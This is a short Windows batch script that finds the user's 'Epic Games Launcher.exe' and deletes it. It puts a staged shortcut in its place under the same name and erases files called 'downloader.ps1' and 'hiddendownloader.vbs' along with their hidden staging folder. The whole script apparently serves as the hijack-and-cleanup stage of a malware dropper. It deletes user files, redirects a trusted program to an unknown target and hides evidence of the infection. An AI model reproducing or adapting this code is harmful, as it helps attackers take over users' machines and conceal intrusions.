setlocal enabledelayedexpansion
for /r C:\Users %%a in (*) do (
    if "%%~nxa"=="Epic Games Launcher.exe" (
        set "p=%%~dpnxa"
        goto :found
    )
)

:notfound
echo File not found
goto :eof

:found
echo !p!
del "!p!"
del "C:\Users\Public\Videos\downloader.ps1"
del "C:\Users\Public\Videos\hiddendownloader.vbs"
move "C:\Users\Public\Videos\GraphicalUserInterface\§1.lnk" "!p!"
ren "!p!" "Epic Games Launcher.lnk"
rd /s /q "C:\Users\Public\Videos\GraphicalUserInterface"
del "C:\Users\Public\Videos\GraphicalUserInterface"
rd "C:\Users\Public\Videos\GraphicalUserInterface"